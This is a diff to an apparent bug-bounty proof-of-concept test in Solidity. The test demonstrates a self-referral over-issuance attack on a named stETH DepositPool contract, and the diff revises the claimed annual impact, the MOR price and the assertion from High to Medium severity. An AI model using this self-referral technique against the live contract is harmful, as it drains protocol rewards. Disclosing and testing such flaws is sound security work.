@@ -39,7 +39,7 @@ interface IDepositPool {
  *
  * TARGET: DepositPool (stETH) @ 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790
  * BLOCK: 25950629 (September 11, 2024)
- * IMPACT: $14,137/year over-issuance via self-referral attack
+ * IMPACT: $2,716/year over-issuance via self-referral attack (MEDIUM severity)
  *
  * This PoC demonstrates:
  * 1. Missing validation allows self-referral (no require(referrer_ != user_))
@@ -126,23 +126,23 @@ contract SelfReferralOverIssuance is Test {
         uint256 dailyOverIssuance = (dailyMOR * attackerShare * (totalAdvantage - 100)) / (10000 * 100);
         uint256 annualOverIssuance = dailyOverIssuance * 365;
 
-        // At $7.82/MOR current price
-        uint256 morPriceCents = 782; // $7.82
+        // At $1.89/MOR current price (Sept 11, 2024)
+        uint256 morPriceCents = 189; // $1.89
         uint256 annualLossUSD = (annualOverIssuance * morPriceCents) / (1e18 * 100);
 
         console.log("\n=== ANNUAL IMPACT ===");
         console.log("Attacker stake:", attackerStake / 1e18, "stETH");
         console.log("Daily over-issuance:", dailyOverIssuance / 1e18, "MOR");
         console.log("Annual over-issuance:", annualOverIssuance / 1e18, "MOR");
-        console.log("At $7.82/MOR: $", annualLossUSD, "/year");
+        console.log("At $1.89/MOR: $", annualLossUSD, "/year");
 
         // ASSERTIONS (program requirement)
 
         // 1. Unfair advantage is material (>10%)
         assertGt(totalAdvantage, 110, "Over 10% unfair advantage");
 
-        // 2. Annual loss exceeds $10k High threshold
-        assertGt(annualLossUSD, 10000, "Annual loss > $10k High threshold");
+        // 2. Annual loss exceeds $2.5k Medium threshold
+        assertGt(annualLossUSD, 2500, "Annual loss > $2.5k Medium threshold");
 
         console.log("\n=== VULNERABILITY CONFIRMED ===");
         console.log("Missing validation at line 370: require(referrer_ != user_)");
